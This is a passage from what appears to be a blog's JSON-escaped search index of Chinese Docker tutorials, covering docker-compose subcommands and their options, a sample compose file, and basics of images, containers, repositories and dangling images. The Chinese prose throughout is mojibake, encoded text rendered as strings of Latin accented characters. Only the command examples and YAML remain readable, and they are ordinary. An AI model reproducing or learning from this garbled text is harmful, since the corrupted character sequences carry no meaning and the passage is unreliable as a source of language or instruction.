æŒ‡å®šé¡¹ç›®åç§°ï¼Œé»˜è®¤å°†ä½¿ç”¨æ‰€åœ¨ç›®å½•åç§°ä½œä¸ºé¡¹ç›®åã€‚\n- `--x-networking` ä½¿ç”¨ Docker çš„å¯æ‹”æ’ç½‘ç»œåç«¯ç‰¹æ€§\n- `--x-network-driver DRIVER` æŒ‡å®šç½‘ç»œåç«¯çš„é©±åŠ¨ï¼Œé»˜è®¤ä¸º `bridge`\n- `--verbose` è¾“å‡ºæ›´å¤šè°ƒè¯•ä¿¡æ¯ã€‚\n- `-v, --version` æ‰“å°ç‰ˆæœ¬å¹¶é€€å‡ºã€‚\n\n \n\nå‘½ä»¤ä½¿ç”¨è¯´æ˜\n\n\n\n8.1 `build` æ„å»ºï¼ˆé‡æ–°æ„å»ºï¼‰é¡¹ç›®ä¸­çš„æœåŠ¡å®¹å™¨\n\næ ¼å¼ä¸º `docker-compose build [options] [SERVICE...]`ã€‚\n\næœåŠ¡å®¹å™¨ä¸€æ—¦æ„å»ºåï¼Œå°†ä¼šå¸¦ä¸Šä¸€ä¸ªæ ‡è®°åï¼Œä¾‹å¦‚å¯¹äº web é¡¹ç›®ä¸­çš„ä¸€ä¸ª db å®¹å™¨ï¼Œå¯èƒ½æ˜¯ web_dbã€‚\n\nå¯ä»¥éšæ—¶åœ¨é¡¹ç›®ç›®å½•ä¸‹è¿è¡Œ `docker-compose build` æ¥é‡æ–°æ„å»ºæœåŠ¡ã€‚\n\né€‰é¡¹åŒ…æ‹¬ï¼š\n\n- `--force-rm` åˆ é™¤æ„å»ºè¿‡ç¨‹ä¸­çš„ä¸´æ—¶å®¹å™¨ã€‚\n- `--no-cache` æ„å»ºé•œåƒè¿‡ç¨‹ä¸­ä¸ä½¿ç”¨ cacheï¼ˆè¿™å°†åŠ é•¿æ„å»ºè¿‡ç¨‹ï¼‰ã€‚\n- `--pull` å§‹ç»ˆå°è¯•é€šè¿‡ pull æ¥è·å–æ›´æ–°ç‰ˆæœ¬çš„é•œåƒã€‚\n\n\n\n8.2 `config` éªŒè¯ Compose æ–‡ä»¶æ ¼å¼æ˜¯å¦æ­£ç¡®ï¼Œè‹¥æ­£ç¡®åˆ™æ˜¾ç¤ºé…ç½®ï¼Œè‹¥æ ¼å¼é”™è¯¯æ˜¾ç¤ºé”™è¯¯åŸå› \n\n\n\n8.3 `down` æ­¤å‘½ä»¤å°†ä¼šåœæ­¢ `up` å‘½ä»¤æ‰€å¯åŠ¨çš„å®¹å™¨ï¼Œå¹¶ç§»é™¤ç½‘ç»œ\n\n\n\n8.4 `exec` è¿›å…¥æŒ‡å®šçš„å®¹å™¨\n\n\n\n8.5 `help` è·å¾—ä¸€ä¸ªå‘½ä»¤çš„å¸®åŠ©\n\n\n\n8.6 `images` åˆ—å‡º Compose æ–‡ä»¶ä¸­åŒ…å«çš„é•œåƒ\n\n\n\n8.7 `kill` é€šè¿‡å‘é€ `SIGKILL` ä¿¡å·æ¥å¼ºåˆ¶åœæ­¢æœåŠ¡å®¹å™¨\n\næ ¼å¼ä¸º `docker-compose kill [options] [SERVICE...]`ã€‚\n\næ”¯æŒé€šè¿‡ `-s` å‚æ•°æ¥æŒ‡å®šå‘é€çš„ä¿¡å·ï¼Œä¾‹å¦‚é€šè¿‡å¦‚ä¸‹æŒ‡ä»¤å‘é€ `SIGINT` ä¿¡å·ã€‚\n\n```\n$ docker-compose kill -s SIGINT\n```\n\n\n\n8.8 `logs` æŸ¥çœ‹æœåŠ¡å®¹å™¨çš„è¾“å‡º\n\næ ¼å¼ä¸º `docker-compose logs [options] [SERVICE...]`ã€‚\n\né»˜è®¤æƒ…å†µä¸‹ï¼Œdocker-compose å°†å¯¹ä¸åŒçš„æœåŠ¡è¾“å‡ºä½¿ç”¨ä¸åŒçš„é¢œè‰²æ¥åŒºåˆ†ã€‚å¯ä»¥é€šè¿‡ `--no-color` æ¥å…³é—­é¢œè‰²ã€‚\n\nè¯¥å‘½ä»¤åœ¨è°ƒè¯•é—®é¢˜çš„æ—¶å€™ååˆ†æœ‰ç”¨ã€‚\n\n\n\n8.9 `pause` æš‚åœä¸€ä¸ªæœåŠ¡å®¹å™¨\n\næ ¼å¼ä¸º `docker-compose pause [SERVICE...]`ã€‚\n\n\n\n8.10 `port` æ‰“å°æŸä¸ªå®¹å™¨ç«¯å£æ‰€æ˜ å°„çš„å…¬å…±ç«¯å£\n\næ ¼å¼ä¸º `docker-compose port [options] SERVICE PRIVATE_PORT`ã€‚\n\né€‰é¡¹ï¼š\n\n- `--protocol=proto` æŒ‡å®šç«¯å£åè®®ï¼Œtcpï¼ˆé»˜è®¤å€¼ï¼‰æˆ–è€… udpã€‚\n- `--index=index` å¦‚æœåŒä¸€æœåŠ¡å­˜åœ¨å¤šä¸ªå®¹å™¨ï¼ŒæŒ‡å®šå‘½ä»¤å¯¹è±¡å®¹å™¨çš„åºå·ï¼ˆé»˜è®¤ä¸º 1ï¼‰ã€‚\n\n  \n\n8.11 `ps` åˆ—å‡ºé¡¹ç›®ä¸­ç›®å‰çš„æ‰€æœ‰å®¹å™¨\n\næ ¼å¼ä¸º `docker-compose ps [options] [SERVICE...]`ã€‚\n\né€‰é¡¹ï¼š\n\n- `-q` åªæ‰“å°å®¹å™¨çš„ ID ä¿¡æ¯ã€‚\n\n\n\n8.12 `pull` æ‹‰å–æœåŠ¡ä¾èµ–çš„é•œåƒ\n\næ ¼å¼ä¸º `docker-compose pull [options] [SERVICE...]`ã€‚\n\né€‰é¡¹ï¼š\n\n- `--ignore-pull-failures` å¿½ç•¥æ‹‰å–é•œåƒè¿‡ç¨‹ä¸­çš„é”™è¯¯ã€‚\n\n\n\n8.13 `push` æ¨é€æœåŠ¡ä¾èµ–çš„é•œåƒåˆ° Docker é•œåƒä»“åº“\n\n\n\n8.14 `restart` é‡å¯é¡¹ç›®ä¸­çš„æœåŠ¡\n\næ ¼å¼ä¸º `docker-compose restart [options] [SERVICE...]`ã€‚\n\né€‰é¡¹ï¼š\n\n- `-t, --timeout TIMEOUT` æŒ‡å®šé‡å¯å‰åœæ­¢å®¹å™¨çš„è¶…æ—¶ï¼ˆé»˜è®¤ä¸º 10 ç§’ï¼‰ã€‚\n\n\n\n8.15 `rm` åˆ é™¤æ‰€æœ‰ï¼ˆåœæ­¢çŠ¶æ€çš„ï¼‰æœåŠ¡å®¹å™¨\n\næ¨èå…ˆæ‰§è¡Œ `docker-compose stop` å‘½ä»¤æ¥åœæ­¢å®¹å™¨ã€‚\n\næ ¼å¼ä¸º `docker-compose rm [options] [SERVICE...]`ã€‚\n\né€‰é¡¹ï¼š\n\n- `-f, --force` å¼ºåˆ¶ç›´æ¥åˆ é™¤ï¼ŒåŒ…æ‹¬éåœæ­¢çŠ¶æ€çš„å®¹å™¨ã€‚ä¸€èˆ¬å°½é‡ä¸è¦ä½¿ç”¨è¯¥é€‰é¡¹ã€‚\n- `-v` åˆ é™¤å®¹å™¨æ‰€æŒ‚è½½çš„æ•°æ®å·ã€‚\n\n \n\n8.16 `run` åœ¨æŒ‡å®šæœåŠ¡ä¸Šæ‰§è¡Œä¸€ä¸ªå‘½ä»¤\n\næ ¼å¼ä¸º `docker-compose run [options] [-p PORT...] [-e KEY=VAL...] SERVICE [COMMAND] [ARGS...]`ã€‚\n\nä¾‹å¦‚ï¼š\n\n```\n$ docker-compose run ubuntu ping docker.com\n```\n\nå°†ä¼šå¯åŠ¨ä¸€ä¸ª ubuntu æœåŠ¡å®¹å™¨ï¼Œå¹¶æ‰§è¡Œ `ping docker.com` å‘½ä»¤ã€‚\n\né»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœå­˜åœ¨å…³è”ï¼Œåˆ™æ‰€æœ‰å…³è”çš„æœåŠ¡å°†ä¼šè‡ªåŠ¨è¢«å¯åŠ¨ï¼Œé™¤éè¿™äº›æœåŠ¡å·²ç»åœ¨è¿è¡Œä¸­ã€‚\n\n\n\nè¯¥å‘½ä»¤ç±»ä¼¼å¯åŠ¨å®¹å™¨åè¿è¡ŒæŒ‡å®šçš„å‘½ä»¤ï¼Œç›¸å…³å·ã€é“¾æ¥ç­‰ç­‰éƒ½å°†ä¼šæŒ‰ç…§é…ç½®è‡ªåŠ¨åˆ›å»ºã€‚\n\nä¸¤ä¸ªä¸åŒç‚¹ï¼š\n\n- ç»™å®šå‘½ä»¤å°†ä¼šè¦†ç›–åŸæœ‰çš„è‡ªåŠ¨è¿è¡Œå‘½ä»¤ï¼›\n- ä¸ä¼šè‡ªåŠ¨åˆ›å»ºç«¯å£ï¼Œä»¥é¿å…å†²çªã€‚\n\nå¦‚æœä¸å¸Œæœ›è‡ªåŠ¨å¯åŠ¨å…³è”çš„å®¹å™¨ï¼Œå¯ä»¥ä½¿ç”¨ `--no-deps` é€‰é¡¹ï¼Œä¾‹å¦‚\n\n```\n$ docker-compose run --no-deps web python manage.py shell\n```\n\nå°†ä¸ä¼šå¯åŠ¨ web å®¹å™¨æ‰€å…³è”çš„å…¶å®ƒå®¹å™¨ã€‚\n\né€‰é¡¹ï¼š\n\n- `-d` åå°è¿è¡Œå®¹å™¨ã€‚\n- `--name NAME` ä¸ºå®¹å™¨æŒ‡å®šä¸€ä¸ªåå­—ã€‚\n- `--entrypoint CMD` è¦†ç›–é»˜è®¤çš„å®¹å™¨å¯åŠ¨æŒ‡ä»¤ã€‚\n- `-e KEY=VAL` è®¾ç½®ç¯å¢ƒå˜é‡å€¼ï¼Œå¯å¤šæ¬¡ä½¿ç”¨é€‰é¡¹æ¥è®¾ç½®å¤šä¸ªç¯å¢ƒå˜é‡ã€‚\n- `-u, --user=\"\"` æŒ‡å®šè¿è¡Œå®¹å™¨çš„ç”¨æˆ·åæˆ–è€… uidã€‚\n- `--no-deps` ä¸è‡ªåŠ¨å¯åŠ¨å…³è”çš„æœåŠ¡å®¹å™¨ã€‚\n- `--rm` è¿è¡Œå‘½ä»¤åè‡ªåŠ¨åˆ é™¤å®¹å™¨ï¼Œ`d` æ¨¡å¼ä¸‹å°†å¿½ç•¥ã€‚\n- `-p, --publish=[]` æ˜ å°„å®¹å™¨ç«¯å£åˆ°æœ¬åœ°ä¸»æœºã€‚\n- `--service-ports` é…ç½®æœåŠ¡ç«¯å£å¹¶æ˜ å°„åˆ°æœ¬åœ°ä¸»æœºã€‚\n- `-T` ä¸åˆ†é…ä¼ª ttyï¼Œæ„å‘³ç€ä¾èµ– tty çš„æŒ‡ä»¤å°†æ— æ³•è¿è¡Œã€‚\n\n \n\n8.17 `scale` è®¾ç½®æŒ‡å®šæœåŠ¡è¿è¡Œçš„å®¹å™¨ä¸ªæ•°\n\næ ¼å¼ä¸º `docker-compose scale [options] [SERVICE=NUM...]`ã€‚\n\né€šè¿‡ `service=num` çš„å‚æ•°æ¥è®¾ç½®æ•°é‡ã€‚ä¾‹å¦‚ï¼š\n\n```\n$ docker-compose scale web=3 db=2\n```\n\nå°†å¯åŠ¨ 3 ä¸ªå®¹å™¨è¿è¡Œ web æœåŠ¡ï¼Œ2 ä¸ªå®¹å™¨è¿è¡Œ db æœåŠ¡ã€‚\n\nä¸€èˆ¬çš„ï¼Œå½“æŒ‡å®šæ•°ç›®å¤šäºè¯¥æœåŠ¡å½“å‰å®é™…è¿è¡Œå®¹å™¨ï¼Œå°†æ–°åˆ›å»ºå¹¶å¯åŠ¨å®¹å™¨ï¼›åä¹‹ï¼Œå°†åœæ­¢å®¹å™¨ã€‚\n\né€‰é¡¹ï¼š\n\n- `-t, --timeout TIMEOUT` åœæ­¢å®¹å™¨æ—¶å€™çš„è¶…æ—¶ï¼ˆé»˜è®¤ä¸º 10 ç§’ï¼‰ã€‚\n\n\n\n8.18 `start` å¯åŠ¨å·²ç»å­˜åœ¨çš„æœåŠ¡å®¹å™¨\n\næ ¼å¼ä¸º `docker-compose start [SERVICE...]`ã€‚\n\n\n\n8.19 `stop` åœæ­¢å·²ç»å¤„äºè¿è¡ŒçŠ¶æ€çš„å®¹å™¨ï¼Œä½†ä¸åˆ é™¤å®ƒ\n\né€šè¿‡ `docker-compose start` å¯ä»¥å†æ¬¡å¯åŠ¨è¿™äº›å®¹å™¨ã€‚\n\næ ¼å¼ä¸º `docker-compose stop [options] [SERVICE...]`ã€‚\n\né€‰é¡¹ï¼š\n\n- `-t, --timeout TIMEOUT` åœæ­¢å®¹å™¨æ—¶å€™çš„è¶…æ—¶ï¼ˆé»˜è®¤ä¸º 10 ç§’ï¼‰ã€‚\n\n\n\n8.20 `top` æŸ¥çœ‹å„ä¸ªæœåŠ¡å®¹å™¨å†…è¿è¡Œçš„è¿›ç¨‹\n\n \n\n8.21 `unpause` æ¢å¤å¤„äºæš‚åœçŠ¶æ€ä¸­çš„æœåŠ¡\n\næ ¼å¼ä¸º `docker-compose unpause [SERVICE...]`ã€‚\n\n\n\n8.22 `up` å¯åŠ¨ä¸€ä¸ªé¡¹ç›®\n\næ ¼å¼ä¸º `docker-compose up [options] [SERVICE...]`ã€‚\n\nè¯¥å‘½ä»¤ååˆ†å¼ºå¤§ï¼Œå®ƒå°†å°è¯•è‡ªåŠ¨å®ŒæˆåŒ…æ‹¬æ„å»ºé•œåƒï¼Œï¼ˆé‡æ–°ï¼‰åˆ›å»ºæœåŠ¡ï¼Œå¯åŠ¨æœåŠ¡ï¼Œå¹¶å…³è”æœåŠ¡ç›¸å…³å®¹å™¨çš„ä¸€ç³»åˆ—æ“ä½œã€‚\n\né“¾æ¥çš„æœåŠ¡éƒ½å°†ä¼šè¢«è‡ªåŠ¨å¯åŠ¨ï¼Œé™¤éå·²ç»å¤„äºè¿è¡ŒçŠ¶æ€ã€‚\n\nå¯ä»¥è¯´ï¼Œå¤§éƒ¨åˆ†æ—¶å€™éƒ½å¯ä»¥ç›´æ¥é€šè¿‡è¯¥å‘½ä»¤æ¥å¯åŠ¨ä¸€ä¸ªé¡¹ç›®ã€‚\n\n\n\né»˜è®¤æƒ…å†µï¼Œ`docker-compose up` å¯åŠ¨çš„å®¹å™¨éƒ½åœ¨å‰å°ï¼Œæ§åˆ¶å°å°†ä¼šåŒæ—¶æ‰“å°æ‰€æœ‰å®¹å™¨çš„è¾“å‡ºä¿¡æ¯ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿è¿›è¡Œè°ƒè¯•ã€‚\n\nå½“é€šè¿‡ `Ctrl-C` åœæ­¢å‘½ä»¤æ—¶ï¼Œæ‰€æœ‰å®¹å™¨å°†ä¼šåœæ­¢ã€‚\n\nå¦‚æœä½¿ç”¨ `docker-compose up -d`ï¼Œå°†ä¼šåœ¨åå°å¯åŠ¨å¹¶è¿è¡Œæ‰€æœ‰çš„å®¹å™¨ã€‚ä¸€èˆ¬æ¨èç”Ÿäº§ç¯å¢ƒä¸‹ä½¿ç”¨è¯¥é€‰é¡¹ã€‚\n\né»˜è®¤æƒ…å†µï¼Œå¦‚æœæœåŠ¡å®¹å™¨å·²ç»å­˜åœ¨ï¼Œ`docker-compose up` å°†ä¼šå°è¯•åœæ­¢å®¹å™¨ï¼Œç„¶åé‡æ–°åˆ›å»ºï¼ˆä¿æŒä½¿ç”¨ `volumes-from` æŒ‚è½½çš„å·ï¼‰ï¼Œä»¥ä¿è¯æ–°å¯åŠ¨çš„æœåŠ¡åŒ¹é… `docker-compose.yml` æ–‡ä»¶çš„æœ€æ–°å†…å®¹ã€‚å¦‚æœç”¨æˆ·ä¸å¸Œæœ›å®¹å™¨è¢«åœæ­¢å¹¶é‡æ–°åˆ›å»ºï¼Œå¯ä»¥ä½¿ç”¨ `docker-compose up --no-recreate`ã€‚è¿™æ ·å°†åªä¼šå¯åŠ¨å¤„äºåœæ­¢çŠ¶æ€çš„å®¹å™¨ï¼Œè€Œå¿½ç•¥å·²ç»è¿è¡Œçš„æœåŠ¡ã€‚å¦‚æœç”¨æˆ·åªæƒ³é‡æ–°éƒ¨ç½²æŸä¸ªæœåŠ¡ï¼Œå¯ä»¥ä½¿ç”¨ `docker-compose up --no-deps -d <SERVICE_NAME>` æ¥é‡æ–°åˆ›å»ºæœåŠ¡å¹¶åå°åœæ­¢æ—§æœåŠ¡ï¼Œå¯åŠ¨æ–°æœåŠ¡ï¼Œå¹¶ä¸ä¼šå½±å“åˆ°å…¶æ‰€ä¾èµ–çš„æœåŠ¡ã€‚\n\né€‰é¡¹ï¼š\n\n- `-d` åœ¨åå°è¿è¡ŒæœåŠ¡å®¹å™¨ã€‚\n- `--no-color` ä¸ä½¿ç”¨é¢œè‰²æ¥åŒºåˆ†ä¸åŒçš„æœåŠ¡çš„æ§åˆ¶å°è¾“å‡ºã€‚\n- `--no-deps` ä¸å¯åŠ¨æœåŠ¡æ‰€é“¾æ¥çš„å®¹å™¨ã€‚\n- `--force-recreate` å¼ºåˆ¶é‡æ–°åˆ›å»ºå®¹å™¨ï¼Œä¸èƒ½ä¸ `--no-recreate` åŒæ—¶ä½¿ç”¨ã€‚\n- `--no-recreate` å¦‚æœå®¹å™¨å·²ç»å­˜åœ¨äº†ï¼Œåˆ™ä¸é‡æ–°åˆ›å»ºï¼Œä¸èƒ½ä¸ `--force-recreate` åŒæ—¶ä½¿ç”¨ã€‚\n- `--no-build` ä¸è‡ªåŠ¨æ„å»ºç¼ºå¤±çš„æœåŠ¡é•œåƒã€‚\n- `-t, --timeout TIMEOUT` åœæ­¢å®¹å™¨æ—¶å€™çš„è¶…æ—¶ï¼ˆé»˜è®¤ä¸º 10 ç§’ï¼‰ã€‚\n\n\n\n8.23 `version` æ‰“å°ç‰ˆæœ¬ä¿¡æ¯\n\næ ¼å¼ä¸º `docker-compose version`ã€‚\n\n\n\n8.24 Compose æ¨¡æ¿æ–‡ä»¶\n\næ¨¡æ¿æ–‡ä»¶æ˜¯ä½¿ç”¨Â `Compose`Â çš„æ ¸å¿ƒï¼Œæ¶‰åŠåˆ°çš„æŒ‡ä»¤å…³é”®å­—ä¹Ÿæ¯”è¾ƒå¤šã€‚å¤§éƒ¨åˆ†æŒ‡ä»¤è·ŸÂ `docker run`Â ç›¸å…³å‚æ•°çš„å«ä¹‰éƒ½æ˜¯ç±»ä¼¼çš„ã€‚\n\n\n\né»˜è®¤çš„æ¨¡æ¿æ–‡ä»¶åç§°ä¸º `docker-compose.yml`ï¼Œæ ¼å¼ä¸º YAML æ ¼å¼ã€‚\n\n```\nversion: \"3\"\n\nservices:\n  webapp:\n    image: examples/web\n    ports:\n      - \"80:80\"\n    volumes:\n      - \"/data\"\n```\n\n\n\næ³¨æ„æ¯ä¸ªæœåŠ¡éƒ½å¿…é¡»é€šè¿‡ `image` æŒ‡ä»¤æŒ‡å®šé•œåƒæˆ– `build` æŒ‡ä»¤ï¼ˆéœ€è¦ Dockerfileï¼‰ç­‰æ¥è‡ªåŠ¨æ„å»ºç”Ÿæˆé•œåƒã€‚\n\nå¦‚æœä½¿ç”¨ `build` æŒ‡ä»¤ï¼Œåœ¨ `Dockerfile` ä¸­è®¾ç½®çš„é€‰é¡¹(ä¾‹å¦‚ï¼š`CMD`, `EXPOSE`, `VOLUME`, `ENV` ç­‰) å°†ä¼šè‡ªåŠ¨è¢«è·å–ï¼Œæ— éœ€åœ¨ `docker-compose.yml` ä¸­å†æ¬¡è®¾ç½®ã€‚\n\n\n\n# 8. å‚è€ƒèµ„æ–™\n\n+ dockeråŸºç¡€å…¥é—¨æ•™ç¨‹(ä¸€) https://www.liuvv.com/p/63a578e8.html\n\n","tags":["docker"],"categories":["docker"]},{"title":"dockeråŸºç¡€å…¥é—¨æ•™ç¨‹(ä¸€)","url":"%2Fp%2F63a578e8.html","content":"\n\n\n# 1. åŸºæœ¬æ¦‚å¿µ\n\n### 1.1 é•œåƒ\n\né•œåƒåŒ…å«æ“ä½œç³»ç»Ÿå®Œæ•´çš„Â `root`Â æ–‡ä»¶ç³»ç»Ÿï¼Œå…¶ä½“ç§¯å¾€å¾€æ˜¯åºå¤§çš„ï¼Œå› æ­¤åœ¨ Docker è®¾è®¡æ—¶ï¼Œå°±å……åˆ†åˆ©ç”¨ Union FS çš„æŠ€æœ¯ï¼Œå°†å…¶è®¾è®¡ä¸ºåˆ†å±‚å­˜å‚¨çš„æ¶æ„ã€‚æ‰€ä»¥ä¸¥æ ¼æ¥è¯´ï¼Œé•œåƒå¹¶éæ˜¯åƒä¸€ä¸ª ISO é‚£æ ·çš„æ‰“åŒ…æ–‡ä»¶ï¼Œé•œåƒåªæ˜¯ä¸€ä¸ªè™šæ‹Ÿçš„æ¦‚å¿µï¼Œå…¶å®é™…ä½“ç°å¹¶éç”±ä¸€ä¸ªæ–‡ä»¶ç»„æˆï¼Œè€Œæ˜¯ç”±ä¸€ç»„æ–‡ä»¶ç³»ç»Ÿç»„æˆï¼Œæˆ–è€…è¯´ï¼Œç”±å¤šå±‚æ–‡ä»¶ç³»ç»Ÿè”åˆç»„æˆã€‚\n\n<!-- more -->\n\n### 1.2 å®¹å™¨\n\næ¯ä¸€ä¸ªå®¹å™¨è¿è¡Œæ—¶ï¼Œæ˜¯ä»¥é•œåƒä¸ºåŸºç¡€å±‚ï¼Œåœ¨å…¶ä¸Šåˆ›å»ºä¸€ä¸ªå½“å‰å®¹å™¨çš„å­˜å‚¨å±‚ï¼Œæˆ‘ä»¬å¯ä»¥ç§°è¿™ä¸ªä¸ºå®¹å™¨è¿è¡Œæ—¶è¯»å†™è€Œå‡†å¤‡çš„å­˜å‚¨å±‚ä¸ºå®¹å™¨å­˜å‚¨å±‚ã€‚\n\n\n\nå®¹å™¨ä¸åº”è¯¥å‘å…¶å­˜å‚¨å±‚å†…å†™å…¥ä»»ä½•æ•°æ®ï¼Œå®¹å™¨å­˜å‚¨å±‚è¦ä¿æŒæ— çŠ¶æ€åŒ–ã€‚æ‰€æœ‰çš„æ–‡ä»¶å†™å…¥æ“ä½œï¼Œéƒ½åº”è¯¥ä½¿ç”¨ æ•°æ®å·ï¼ˆVolumeï¼‰ã€æˆ–è€…ç»‘å®šå®¿ä¸»ç›®å½•ï¼Œåœ¨è¿™äº›ä½ç½®çš„è¯»å†™ä¼šè·³è¿‡å®¹å™¨å­˜å‚¨å±‚ï¼Œç›´æ¥å¯¹å®¿ä¸»ï¼ˆæˆ–ç½‘ç»œå­˜å‚¨ï¼‰å‘ç”Ÿè¯»å†™ï¼Œå…¶æ€§èƒ½å’Œç¨³å®šæ€§æ›´é«˜ã€‚\n\næ•°æ®å·çš„ç”Ÿå­˜å‘¨æœŸç‹¬ç«‹äºå®¹å™¨ï¼Œå®¹å™¨æ¶ˆäº¡ï¼Œæ•°æ®å·ä¸ä¼šæ¶ˆäº¡ã€‚å› æ­¤ï¼Œä½¿ç”¨æ•°æ®å·åï¼Œå®¹å™¨åˆ é™¤æˆ–è€…é‡æ–°è¿è¡Œä¹‹åï¼Œæ•°æ®å´ä¸ä¼šä¸¢å¤±ã€‚\n\n\n\n### 1.3 ä»“åº“\n\nä¸€ä¸ªä»“åº“ä¼šåŒ…å«åŒä¸€ä¸ªè½¯ä»¶ä¸åŒç‰ˆæœ¬çš„é•œåƒï¼Œè€Œæ ‡ç­¾å°±å¸¸ç”¨äºå¯¹åº”è¯¥è½¯ä»¶çš„å„ä¸ªç‰ˆæœ¬ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡Â `<ä»“åº“å>:<æ ‡ç­¾>`Â çš„æ ¼å¼æ¥æŒ‡å®šå…·ä½“æ˜¯è¿™ä¸ªè½¯ä»¶å“ªä¸ªç‰ˆæœ¬çš„é•œåƒã€‚å¦‚æœä¸ç»™å‡ºæ ‡ç­¾ï¼Œå°†ä»¥Â `latest`Â ä½œä¸ºé»˜è®¤æ ‡ç­¾ã€‚\n\n\n\nä»¥ Ubuntu é•œåƒ ä¸ºä¾‹ï¼Œ`ubuntu`Â æ˜¯ä»“åº“çš„åå­—ï¼Œå…¶å†…åŒ…å«æœ‰ä¸åŒçš„ç‰ˆæœ¬æ ‡ç­¾ï¼Œå¦‚ï¼Œ`14.04`,Â `16.04`ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡Â `ubuntu:14.04`ï¼Œæˆ–è€…Â `ubuntu:16.04`Â æ¥å…·ä½“æŒ‡å®šæ‰€éœ€å“ªä¸ªç‰ˆæœ¬çš„é•œåƒã€‚å¦‚æœå¿½ç•¥äº†æ ‡ç­¾ï¼Œæ¯”å¦‚Â `ubuntu`ï¼Œé‚£å°†è§†ä¸ºÂ `ubuntu:latest`ã€‚\n\n\n\nä»“åº“åç»å¸¸ä»¥Â *ä¸¤æ®µå¼è·¯å¾„*Â å½¢å¼å‡ºç°ï¼Œæ¯”å¦‚Â `jwilder/nginx-proxy`ï¼Œå‰è€…å¾€å¾€æ„å‘³ç€ Docker Registry å¤šç”¨æˆ·ç¯å¢ƒä¸‹çš„ç”¨æˆ·åï¼Œåè€…åˆ™å¾€å¾€æ˜¯å¯¹åº”çš„è½¯ä»¶åã€‚ä½†è¿™å¹¶éç»å¯¹ï¼Œå–å†³äºæ‰€ä½¿ç”¨çš„å…·ä½“ Docker Registry çš„è½¯ä»¶æˆ–æœåŠ¡ã€‚\n\n\n\n# 2. ä½¿ç”¨é•œåƒ\n\n### 2.1 è·å–é•œåƒ\n\n```\ndocker pull [é€‰é¡¹] [Docker Registry åœ°å€[:ç«¯å£å·]/]ä»“åº“å[:æ ‡ç­¾]\n```\n\n- Docker é•œåƒä»“åº“åœ°å€ï¼šåœ°å€çš„æ ¼å¼ä¸€èˆ¬æ˜¯ `<åŸŸå/IP>[:ç«¯å£å·]`ã€‚é»˜è®¤åœ°å€æ˜¯ Docker Hubã€‚\n- ä»“åº“åï¼šå¦‚ä¹‹å‰æ‰€è¯´ï¼Œè¿™é‡Œçš„ä»“åº“åæ˜¯ä¸¤æ®µå¼åç§°ï¼Œå³ `<ç”¨æˆ·å>/<è½¯ä»¶å>`ã€‚å¯¹äº Docker Hubï¼Œå¦‚æœä¸ç»™å‡ºç”¨æˆ·åï¼Œåˆ™é»˜è®¤ä¸º `library`ï¼Œä¹Ÿå°±æ˜¯å®˜æ–¹é•œåƒã€‚\n\n```\ndocker pull ubuntu:16.04\n16.04: Pulling from library/ubuntu\n```\n\n\n\n### 2.2 è¿è¡Œå®¹å™¨\n\n```\ndocker run -it --rm \\\n    ubuntu:16.04 \\\n    bash\n```\n\n- `-it`ï¼šè¿™æ˜¯ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯ `-i`ï¼šäº¤äº’å¼æ“ä½œï¼Œä¸€ä¸ªæ˜¯ `-t` ç»ˆç«¯ã€‚æˆ‘ä»¬è¿™é‡Œæ‰“ç®—è¿›å…¥ `bash` æ‰§è¡Œä¸€äº›å‘½ä»¤å¹¶æŸ¥çœ‹è¿”å›ç»“æœï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦äº¤äº’å¼ç»ˆç«¯ã€‚\n- `--rm`ï¼šè¿™ä¸ªå‚æ•°æ˜¯è¯´å®¹å™¨é€€å‡ºåéšä¹‹å°†å…¶åˆ é™¤ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸ºäº†æ’éšœéœ€æ±‚ï¼Œé€€å‡ºçš„å®¹å™¨å¹¶ä¸ä¼šç«‹å³åˆ é™¤ï¼Œé™¤éæ‰‹åŠ¨ `docker rm`ã€‚æˆ‘ä»¬è¿™é‡Œåªæ˜¯éšä¾¿æ‰§è¡Œä¸ªå‘½ä»¤ï¼Œçœ‹çœ‹ç»“æœï¼Œä¸éœ€è¦æ’éšœå’Œä¿ç•™ç»“æœï¼Œå› æ­¤ä½¿ç”¨ `--rm` å¯ä»¥é¿å…æµªè´¹ç©ºé—´ã€‚\n- `ubuntu:16.04`ï¼šè¿™æ˜¯æŒ‡ç”¨ `ubuntu:16.04` é•œåƒä¸ºåŸºç¡€æ¥å¯åŠ¨å®¹å™¨ã€‚\n- `bash`ï¼šæ”¾åœ¨é•œåƒååçš„æ˜¯**å‘½ä»¤**ï¼Œè¿™é‡Œæˆ‘ä»¬å¸Œæœ›æœ‰ä¸ªäº¤äº’å¼ Shellï¼Œå› æ­¤ç”¨çš„æ˜¯ `bash`\n\n\n\n### 2.3 åˆ—å‡ºé•œåƒ\n\n```\ndocker images\n```\n\nåˆ—è¡¨åŒ…å«äº† `ä»“åº“å`ã€`æ ‡ç­¾`ã€`é•œåƒ ID`ã€`åˆ›å»ºæ—¶é—´` ä»¥åŠ `æ‰€å ç”¨çš„ç©ºé—´`ã€‚\n\n**é•œåƒ ID** åˆ™æ˜¯é•œåƒçš„å”¯ä¸€æ ‡è¯†ï¼Œä¸€ä¸ªé•œåƒå¯ä»¥å¯¹åº”å¤šä¸ª**æ ‡ç­¾**ã€‚\n\n\n\n### 2.4 è™šæ‚¬é•œåƒ\n\nÂ `docker pull`Â å¯èƒ½å¯¼è‡´è¿™ç§æƒ…å†µï¼Œ`docker build`Â ä¹ŸåŒæ ·å¯ä»¥å¯¼è‡´è¿™ç§ç°è±¡ã€‚ç”±äºæ–°æ—§é•œåƒåŒåï¼Œæ—§é•œåƒåç§°è¢«å–æ¶ˆï¼Œä»è€Œå‡ºç°ä»“åº“åã€æ ‡ç­¾å‡ä¸ºÂ `<none>`Â çš„é•œåƒã€‚è¿™ç±»æ— æ ‡ç­¾é•œåƒä¹Ÿè¢«ç§°ä¸ºÂ **è™šæ‚¬é•œåƒ(dangling image)**\n\n\n\nä¸€èˆ¬æ¥è¯´ï¼Œè™šæ‚¬é•œåƒå·²ç»å¤±å»äº†å­˜åœ¨çš„ä»·å€¼ï¼Œæ˜¯å¯ä»¥éšæ„åˆ é™¤çš„ï¼Œå¯ä»¥ç”¨ä¸‹é¢çš„å‘½ä»¤åˆ é™¤ã€‚\n\n```\ndocker image prune\n```\n\n\n\n### 2.5 